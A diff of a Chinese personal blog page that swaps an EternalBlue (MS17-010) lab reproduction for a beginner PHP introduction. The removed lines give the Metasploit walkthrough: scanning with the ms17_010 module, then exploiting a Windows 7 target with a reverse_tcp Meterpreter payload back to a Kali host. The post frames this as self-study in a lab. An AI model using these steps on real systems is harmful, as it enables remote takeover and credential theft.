@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>永恒之蓝 MS17-010 漏洞复现 | 1in</title>
+  <title>1in</title>
 
   
     
@@ -310,14 +310,14 @@
 
 
 
-<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/8.jpg" style="background-repeat: no-repeat; background-size: cover; 
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/1.jpg" style="background-repeat: no-repeat; background-size: cover; 
   background-position: center center;position: relative;">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="title-box">
     <span class="title">
-      永恒之蓝 MS17-010 漏洞复现
+      
     </span>
   </div>
   
@@ -334,7 +334,7 @@
       
       <div class="post-meta">
         <i class="fa fa-clock-o" aria-hidden="true"></i>
-        <span class="post-time">2021-06-16</span>
+        <span class="post-time">2021-08-05</span>
       </div>
       
       <div class="post-tags-categories">
@@ -342,32 +342,24 @@
         
       </div>
       <div class="post-content">
-        <p>﻿# 永恒之蓝 MS17-010 漏洞复现<br><font color=#999AAA ></p>
-<font color=#999AAA >
-
-<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
-</font>
-
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<h1 id="何为永恒之蓝？"><a href="#何为永恒之蓝？" class="headerlink" title="何为永恒之蓝？"></a>何为永恒之蓝？</h1><p><font color=#999AAA ></font></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<p><font color=#999AAA >永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
-<h1 id="一、什么是SMB协议"><a href="#一、什么是SMB协议" class="headerlink" title="一、什么是SMB协议"></a>一、什么是SMB协议</h1><p><font color=#999AAA >SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
-<h2 id="SMB工作原理是什么？"><a href="#SMB工作原理是什么？" class="headerlink" title="SMB工作原理是什么？"></a>SMB工作原理是什么？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</span><br><span class="line"></span><br><span class="line">     （<span class="number">2</span>）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</span><br><span class="line"></span><br><span class="line">      （<span class="number">3</span>）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</span><br><span class="line"></span><br><span class="line">      （<span class="number">4</span>）：连接到相应资源后，SMB客户端就能够通过<span class="built_in">open</span> SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</span><br></pre></td></tr></table></figure>
-
-<h1 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h1><p>1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机）<br>2.设置kali 的IP地址为自动获取，查看kali  IP地址：ifconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131421195.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看到kali 的IP地址是<strong>192.168.127.131</strong><br>3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131501939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见windows 7 的IP地址为<strong>192.168.127.134</strong></p>
-<h1 id="三、实验步骤："><a href="#三、实验步骤：" class="headerlink" title="三、实验步骤："></a>三、实验步骤：</h1><p>1.测试两台主机的连通性：用kali 去Ping windows 7的主机，来测试连通性：<code>ping 192.168.127.134</code>  <strong>（记得关掉靶机的防火墙）</strong><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021061613170094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见两台主机连通性良好<br>2.查看kali 主机数据库是否开启：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131723734.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：Active：inactive （dead）说明数据库此时是关闭的；</p>
-<p>3.打开kali 主机的数据库： <code>service postgresql start</code></p>
-<p>4.再次查看kali 主机的数据库：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131754963.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：<code>Active：active （exited）</code>说明此时数据库已经打开</p>
-<p>5.进行msfdb 数据库初始化，配置数据库相关信息：<code>msfdb init</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131822701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>此时就可以进行永恒之蓝漏洞扫描，（<strong>永恒之蓝利用的是ms17_010漏洞，因此到这一步之后的任务就是在kali 里寻找ms17_010漏洞，并且利用该漏洞进行攻击，获得windows 7 的管理员权限</strong>）<br>6.启动msf：<code>msfconsole</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131917773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>这样就成功进入了msf中，（<strong>每个人每次进去都会有不同的界面出现）</strong></p>
-<p>7.查看数据库连接情况：在msf命令提示符下：<code>db_status</code>(下面的msf命令提示符也说明了已经进入了msf中)<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132008669.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><code>postgresql connected to msf</code> 说明已经成功连接到了<code>msf</code><br>8.搜索ms17_010:<code>search ms17_010</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132116915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>如果多次还是没有发现上述界面，那么有可能是kali 版本太低，没有ms17_010漏洞，所以建议安装更新版本的kali</strong><br>9.使用ms17_010模块进行漏洞扫描<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132206274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>扫描命令：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>攻击命令（后面使用）：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132303192.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong><em>10.如果不知道应该使用什么命令，则输入options来获得帮助</em></strong></p>
-<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132324419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>在此，只关注两个命令：RHOSTS和THREADS，RHOSTS是要扫描的主机（主机段），THREADS是线程，默认是1，开始使用线程加快扫描</strong><br>11.设置扫描的主机或者主机段（由于靶机IP地址是192.168.127.134，因此设置扫描主机段为192.168.127.131/24）：set rhosts 192.168.223.141/24;然后设置扫描线程为20；最后输入run执行扫描。<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132453511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>12.进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132515521.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置攻击目标（靶机）：<span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line">设置攻击载荷：<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">设置监听主机（kali）：<span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
-<p>利用exploit进行攻击：exploit<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132605398.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132722915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>①：表示永恒之蓝覆盖成功完成<br>②：目标主机和攻击机建立了了一个shell连接，会话为session 1<br>③：得到一个meterpreter会话，尝试获取shell失败<br>④：在meterpreter会话下输入ps就能获得目标主机的当前进程<br>注： meterpreter是metasploit框架中的一个扩展模块，是后渗透攻击中的杀手锏，使用meterpreter作为攻击载荷，建立连接后可以对目标系统进行更深入的渗透，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908293">meterpreter模块之后渗透攻击</a><br><strong>到这里漏洞攻击已经成功，接下来要做的就是后渗透攻击，涉及到权限提升，跳板攻击，密码哈希值获取，获取shell以及其他更多信息</strong><br>参考优秀文章如下：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/104044002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162382014616780265486845%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162382014616780265486845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-104044002.pc_search_result_cache&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1018.2226.3001.4187">永恒之蓝漏洞复现</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908131">永恒之蓝漏洞复现</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这次复现学习了不少知识 学不会的东西可以多查一查文章 多试试  有时候不知道哪里错啦 可以去问一问这方面的师父 但是通过自己来解决问题的时候  感觉是很不一样的！<br>附上windows7的镜像</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1TWDS_VJO2LOqlKniR__4uA </span><br><span class="line">提取码：more </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure>
+        <p><a name="RWVrl"></a></p>
+<h1 id="一、学习要求"><a href="#一、学习要求" class="headerlink" title="一、学习要求"></a>一、学习要求</h1><p><a name="PtRNb"></a></p>
+<h2 id="1-html-css"><a href="#1-html-css" class="headerlink" title="1.html css"></a>1.html css</h2><p><a name="V4iDt"></a></p>
+<h2 id="2-对编程以及网站开发有弄厚的兴趣"><a href="#2-对编程以及网站开发有弄厚的兴趣" class="headerlink" title="2.对编程以及网站开发有弄厚的兴趣"></a>2.对编程以及网站开发有弄厚的兴趣</h2><p><a name="ILZKU"></a></p>
+<h1 id="二、PHP概述"><a href="#二、PHP概述" class="headerlink" title="二、PHP概述"></a>二、PHP概述</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。 [1-2]  PHP同时支持面向对象和面向过程的开发，使用上非常灵活。</span><br><span class="line">经过二十多年的发展，随着php-cli相关组件的快速发展和完善，PHP已经可以应用在 TCP/UDP服务、高性能Web、WebSocket服务、物联网、实时通讯、游戏、微服务等非 Web 领域的系统研发。 [21] </span><br><span class="line">根据W3Techs2019年12月6号发布的统计数据，PHP在WEB网站服务器端使用的编程语言所占份额高达78.9% [23]  。在内容管理系统的网站中，有58.7%的网站使用WordPress（PHP开发的CMS系统），这占所有网站的25.0%。</span><br></pre></td></tr></table></figure>
+<p><a name="H4Qx9"></a></p>
+<h2 id="1-PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点"><a href="#1-PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点" class="headerlink" title="1.PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点"></a>1.PHP的语法借鉴了C语言，Java和Perf等流行计算机语言的特点</h2><p><a name="smVC0"></a></p>
+<h2 id="2-PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）"><a href="#2-PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）" class="headerlink" title="2.PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）"></a>2.PHP的主要目标是允许网络开发人员快速编写动态页面（信息的更新）</h2><p><a name="6DNqB"></a></p>
+<h2 id="3-PHP主要被用于各种类型的网站程序"><a href="#3-PHP主要被用于各种类型的网站程序" class="headerlink" title="3.PHP主要被用于各种类型的网站程序"></a>3.PHP主要被用于各种类型的网站程序</h2><p><a name="ykstk"></a></p>
+<h2 id="4-PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。"><a href="#4-PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。" class="headerlink" title="4.PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。"></a>4.PHP可用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他操作。</h2><p><a name="77ME1"></a></p>
+<h2 id="5-PHP是脚本语言不需要事先编译，在服务器端运行"><a href="#5-PHP是脚本语言不需要事先编译，在服务器端运行" class="headerlink" title="5.PHP是脚本语言不需要事先编译，在服务器端运行"></a>5.PHP是脚本语言不需要事先编译，在服务器端运行</h2><p><a name="6ECdD"></a></p>
+<h2 id="6-PHP可以运行在Windows-Linux等操作系统上"><a href="#6-PHP可以运行在Windows-Linux等操作系统上" class="headerlink" title="6.PHP可以运行在Windows Linux等操作系统上"></a>6.PHP可以运行在Windows Linux等操作系统上</h2><p><a name="5BvpT"></a></p>
+<h1 id="三、Web工作原理"><a href="#三、Web工作原理" class="headerlink" title="三、Web工作原理"></a>三、Web工作原理</h1><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1627870336050-7ebbc251-d596-4e2d-9a93-ea1fffe0a2ba.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=822&size=30154&status=done&style=none&width=822" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、用户在浏览器中输入要访问的web站点地址或在已打开的站点点击超链接。</span><br><span class="line"></span><br><span class="line">2、由DNS进行域名解析，找到服务器的IP地址，向该地址指向的web服务器发出请求。</span><br><span class="line"></span><br><span class="line">3、web服务器根据请求将URL地址转换为页面所在的服务器上的文件全名，查找相应的文件。</span><br><span class="line"></span><br><span class="line">4、若URL指向静态文件，则服务器将文件通过http协议传输给用户浏览器；若HTML文档中嵌入了ASP,PHP,JSP等程序，则由服务器直接运行后返回给用户；</span><br><span class="line"></span><br><span class="line">如果web服务器所运行程序包含对数据库的访问，服务器会将查询指令发送给数据库服务器，对数据库执行查询操作，查询结果由数据库返回给web服务器，再由web服务器将结果潜入页面，并以html格式发送给浏览器。</span><br><span class="line"></span><br><span class="line">5、浏览器解释html文档，在客户端屏幕上展示结果。</span><br><span class="line"></span><br><span class="line">web的特点</span><br><span class="line"></span><br><span class="line">1、图形化</span><br><span class="line"></span><br><span class="line">Web 非常流行的一个很重要的原因就在于它可以在一页上同时显示色彩丰富的图形和文本的性能。在Web之前Internet上的信息只有文本形式。Web可以提供将图形、音频、视频信息集合于一体的特性。</span><br><span class="line"></span><br><span class="line">2、与平台无关</span><br><span class="line"></span><br><span class="line">无论用户的系统平台是什么，你都可以通过Internet访问WWW。浏览WWW对系统平台没有什么限制。无论从Windows平台、UNIX平台、Macintosh等平台我们都可以访问WWW。</span><br><span class="line"></span><br><span class="line">3、分布式的</span><br><span class="line"></span><br><span class="line">大量的图形、音频和视频信息会占用相当大的磁盘空间，我们甚至无法预知信息的多少。对于Web没有必要把所有信息都放在一起，信息可以放在不同的站点上，只需要在浏览器中指明这个站点就可以了。</span><br><span class="line"></span><br><span class="line">4、动态的</span><br><span class="line"></span><br><span class="line">由于各Web站点的信息包含站点本身的信息，信息的提供者可以经常对站上的信息进行更新。如某个协议的发展状况，公司的广告等等。一般各信息站点都尽量保证信息的时间性。所以Web站点上的信息是动态的、经常更新的，这一点是由信息的提供者保证的。</span><br><span class="line"></span><br><span class="line">5、交互的</span><br><span class="line"></span><br><span class="line">Web的交互性首先表现在它的超链接上，用户的浏览顺序和所到站点完全由他自己决定。另外通过FORM的形式可以从服务器方获得动态的信息。用户通过填写FORM可以向服务器提交请求，服务器可以根据用户的请求返回相应信息。</span><br></pre></td></tr></table></figure>
+<p><br /><strong>格式： <a href="http://host[:port][abs_path]">http://host[:port][abs_path]</a></strong><br />理解： http:// 表示要通过HTTP协议来定位网络资源<br />            host  表示合法的internet主机域名或者ip地址<br />            port 指定一个端口号  可以省略默认为80<br />            abs_path 被请求资源的位置<br><a name="vrc8E"></a></p>
+<h1 id="四、PHP运行环境安装"><a href="#四、PHP运行环境安装" class="headerlink" title="四、PHP运行环境安装"></a>四、PHP运行环境安装</h1><p><a name="BjOkY"></a></p>
+<h2 id="需要安装的软件"><a href="#需要安装的软件" class="headerlink" title="需要安装的软件"></a>需要安装的软件</h2><p><strong>web服务器： apache</strong><br /><strong>PHP应用服务器：  （用来执行我们编写的PHP程序）</strong><br /><strong>数据库管理系统  数据库服务器  MySQL</strong><br><a name="buJAV"></a></p>
+<h1 id="五、编译器安装"><a href="#五、编译器安装" class="headerlink" title="五、编译器安装"></a>五、编译器安装</h1><p>自行百度噶哈哈或或<br /></p>
 
       </div>
       
@@ -378,7 +370,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2021/06/16/永恒之蓝 MS17-010 漏洞复现/" target="_blank" title="永恒之蓝 MS17-010 漏洞复现">http://nobug777.github.io/2021/06/16/永恒之蓝 MS17-010 漏洞复现/</a>
+    <a href="/2021/08/05/学前准备/" target="_blank" title="">http://nobug777.github.io/2021/08/05/学前准备/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -401,7 +393,7 @@
     <div class="post-nav-img lazyload" data-original="/medias/1.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/08/05/%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87/" class="post-nav-link">
+    <a href="/2021/08/05/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/" class="post-nav-link">
       <div class="title">
         <i class="fa fa-angle-left"></i> Prev:
         <div></div>
@@ -409,10 +401,9 @@
       
       <!-- <div class="content">
         
-一、学习要求
-1.html css
-2.对编程以及网站开发有弄厚的兴趣
-二、PHP概述123PHP（PHP: Hype
+一、初始PHP脚本程序
+1.PHP开始标记&lt;?php **  2.PHP结束标记**** ?&gt;**
+1).
       </div> -->
     </a>
   </div>
@@ -424,15 +415,21 @@
     <div class="post-nav-img lazyload" data-original="/medias/8.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/06/14/ISCC2021-Re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="post-nav-link">
+    <a href="/2021/06/16/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-nav-link">
       <div class="title">
         Next: <i class="fa fa-angle-right"></i>
-        <div>ISCC2021-Re部分题解</div>
+        <div>永恒之蓝 MS17-010 漏洞复现</div>
       </div>
       <!-- <div class="content">
-        ﻿## ISCC2021 RE wp@TOC
-练武题0x00 Garden题目描述：
-1花园里藏了一个小宝贝，你能找到他
+        ﻿# 永恒之蓝 MS17-010 漏洞复现
+
+
+@TOC
+
+
+
+
+永恒之蓝（Eternal Blue）爆发于2017年4
       </div> -->
     </a>
   </div>
